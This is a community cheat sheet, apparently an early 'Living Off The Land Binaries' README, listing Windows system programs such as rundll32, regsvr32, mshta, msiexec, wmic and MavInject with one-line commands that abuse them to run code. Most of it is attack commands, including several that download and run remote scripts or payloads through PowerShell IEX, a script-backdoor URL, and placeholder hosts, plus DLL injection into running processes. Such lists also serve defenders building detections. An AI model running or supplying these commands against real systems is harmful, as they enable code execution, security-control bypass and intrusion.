# LOLBins - Living Off The Land Binaries
Please contribute and do point out errors or resources I have forgotten.
If you are missing from the acknowledgement, please let me know (I did not forget anyone on purpose).    
    
   
# OS BINARIES
   
## Rundll32.exe

* Functions: Execute

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"

rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")

rundll32 shell32.dll,Control_RunDLL payload.dll

rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,

rundll32.exe advpack.dll,RegisterOCX calc.exe

rundll32.exe zipfldr.dll,RouteTheCall calc.exe

rundll32.exe url.dll,OpenURL "C:\test\calc.hta"

rundll32.exe url.dll,OpenURL "C:\test\calc.url"

rundll32.exe url.dll, FileProtocolHandler calc.exe

rundll32.exe ieframe.dll,OpenURL "C:\test\calc.url"

rundll32.exe shdocvw.dll,OpenURL "C:\test\calc.url"

rundll32.exe ieadvpack.dll,LaunchINFSection test.inf,,1,
```
  
Acknowledgements:
* Casey Smith - @subtee
* Jimmy - @bohops
* Moriarty - @Moriarty_Meng
* Adam - @hexacorn
   
   
## Regsvr32.exe
  
* Functions: Execute

```
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
```
   
Acknowledgements:
* Casey Smith - @subtee
   
   
   
## Msbuild.exe
  
* Functions: Execute

```
msbuild.exe pshell.xml
```
  
Acknowledgements:
* Casey Smith - @subtee
  
  
  
## Regsvcs.exe

* Functions: Execute

```
regsvcs.exe /U regsvcs.dll

regsvcs.exe regsvcs.dll
```

Acknowledgements:
* Casey Smith - @subtee
  
  
  
## Regasm.exe

* Functions: Execute

```
regasm.exe /U regsvcs.dll

regasm.exe regsvcs.dll
```

Acknowledgements:
* Casey Smith - @subtee
  
  
   
## InstallUtil.exe

* Functions: Execute

```
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
```

Acknowledgements:
* Casey Smith - @subtee
   
   
   
## mshta.exe

* Functions: Execute

```
mshta.exe evilfile.hta
```

Acknowledgements:
* ?   
   
   
   
## IEExec.exe

* Functions: Execute

```
ieexec.exe http://x.x.x.x:8080/bypass.exe
```

Acknowledgements:
* ?
  
  
  
## PresentationHost.exe

* Functions: Execute

```
Presentationhost.exe C:\temp\Evil.xbap
```

Acknowledgements:
* Casey Smith - @subtee
  
   
   
## Msiexec.exe

* Functions: Execute

```
msiexec /quiet /i cmd.msi
msiexec /q /i http://192.168.100.3/tmp/cmd.png
```

Acknowledgements:
* Casey Smith - @subtee
  
  
  
## CMSTP.exe

* Functions: Execute

```
cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
```

Acknowledgements:
* Oddvar Moe - @oddvarmoe
* Nick Tyrer - @NickTyrer
  
   
    
## Xwizard.exe

* Functions: DLL hijack

```
xwizard.exe  (xwizard.dll in same folder)
```

Acknowledgements:
* Adam - @Hexacorn
  
  
  
## odbcconf.exe

* Functions: Execute

```
odbcconf -f file.rsp
```

Acknowledgements:
* @subtee
   
   
   
## Forfiles.exe

* Functions: Execute

```
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe
```

Acknowledgements:
* Eric - @vector_sec
   
   
   
## SyncAppvPublishingServer.exe

* Functions: Execute

```
SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX
```

Acknowledgements:
* Nick Landers - @monoxgas
   
   
   
## InfDefaultInstall.exe

* Functions: Execute

```
InfDefaultInstall.exe shady.inf
```

Acknowledgements:
* Kyle Hanslovan - @kylehanslovan
   
   
   
## Atbroker.exe

* Functions: Execute

```
ATBroker.exe /start malware
```

Acknowledgements:
* Adam - @hexacorn
   
   
   
## WMIC.exe

* Functions: Execute

```
wmic process call create calc

wmic process get brief /format:"https://www.example.com/file.xsl

wmic os get /format:"MYXSLFILE.xsl"

wmic process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"
```

Acknowledgements:
* Casey Smith - @subtee
   
   
   
## Mavinject32.exe

* Functions: Execute

```
MavInject32.exe <PID> /INJECTRUNNING <PATH DLL>

MavInject32.exe 3110 /INJECTRUNNING c:\folder\evil.dll>
```

Acknowledgements:
* Giuseppe `N3mes1s` - @gN3mes1s
* Adam - @hexacorn
   
   
   
## Runscripthelper.exe

* Functions: Execute

```
runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test
```

Acknowledgements:
* Matt Graeber - @mattifestation
   
   
   
## Control.exe

* Functions: Execute

```
control.exe c:\windows\tasks\file.txt:evil.dll

control.exe 
(Add registry in HKCU\Software\Microsoft\Windows\currentversion\controlpanel\CPLS to manipulate)
```

Acknowledgements:
* Jimmy - @bohops
   
   
   
## ie4unit.exe

* Functions: Execute

```
ie4unit.exe -BaseSettings
(copy out ie4unit.exe and ieuinit.inf - add SCT in the MSIE4RegisterOCX.Windows7 section)
```

Acknowledgements:
* Jimmy - @bohops




